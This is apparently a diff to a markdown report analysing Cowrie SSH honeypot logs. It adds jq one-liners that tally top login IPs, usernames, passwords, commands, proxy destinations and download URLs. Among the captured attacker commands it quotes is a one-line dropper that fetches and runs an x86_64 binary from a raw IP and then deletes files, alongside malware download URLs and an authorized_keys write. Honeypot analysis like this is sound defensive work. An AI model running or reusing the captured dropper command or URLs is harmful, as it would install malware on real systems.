@@ -11,6 +11,9 @@
     286 "62.112.11.8"
     286 "5.182.39.64"
 ```
+The following command was used to gather the top 10 Succesful IPs that were able to login.
+`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.login.success")) .src_ip' | sort | uniq -c | sort -bgr | head -n 10`
+
 
 ### Failed Login IPs
 ```ruby
@@ -25,7 +28,8 @@
       1 "89.22.183.153"
       1 "89.163.150.234"
 ```
-
+The following command was used to gather the top 10 IPs that failed to gain access. 
+`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.login.failed")) .src_ip' | sort | uniq -c | sort -bgr | head -n 10`
 
 ### Top 10 usernames used
 ```ruby
@@ -40,6 +44,9 @@
       8 "deploy"
       7 "oracle"
 ```
+The folowing command was used to gather the top 10 usernames.
+`cat cowrie.json* | jq '. | select(.username) | .username'  | sort | uniq -c | sort -bgr | head -10`
+
 
 ### Top 10 passwords used
 ```ruby
@@ -55,6 +62,9 @@
      11 "12345"
 ```
 
+The following command was used to gather the top Passwords. 
+`cat cowrie.json* | jq '. | select(.password) | .password'  | sort | uniq -c | sort -bgr | head -10`
+
 ### Top 10 Commands
 ```ruby
      17 "rm -rf x86_64; cd /tmp; wget http://107.172.249.148/x86_64; curl -O http://107.172.249.148/x86_64; busybox wget http://107.172.249.148/x86_64; chmod 777 x86_64; ./x86_64 roots; rm -rf *; nc 1 1;"
@@ -68,6 +78,9 @@
       5 "ls -lh $(which ls)"
       5 "lscpu | grep Model"
 ```
+The following command was used to gather this information.
+`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.command.input")) | .input' | sort | uniq -c | sort -bgr | head -n 10`
+
 ### Top 10 TCP IP
 The list contains a list of websites that was visited by people that were using the honeypot as a proxy
 ```ruby
@@ -83,11 +96,17 @@ The list contains a list of websites that was visited by people that were using 
    1849 "208.95.112.1"
 
 ```
+The following command was used to gathered the top 10 sites that were visited using the proxy. 
+`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.direct-tcpip.request")) .dst_ip' | sort | uniq -c | sort -bgr | head -n 10`
+
 ### Top files that was downloaded
 ```ruby
       5 "/root/.ssh/authorized_keys"
       2 ""
 ```
+The following command was ued to gather the top 10 files that were downloaded. 
+`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.session.file_download")) | .destfile' |  grep -v "null" | sort | uniq -c | sort -bgr | head -n 10`
+
 ### Top 10 URLs
 ```ruby
     102 "http://107.172.249.148/x86_64"
@@ -95,3 +114,7 @@ The list contains a list of websites that was visited by people that were using 
       2 "http://71.127.148.69/.x/1sh"
       1 "http://71.127.148.69/.x/3sh"
 ```
+
+The following command was used to gather URLS that were used to download files. 
+`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.session.file_download")) | .url' | grep -v "null" | sort | uniq -c | sort -bgr | head -n 10`
+
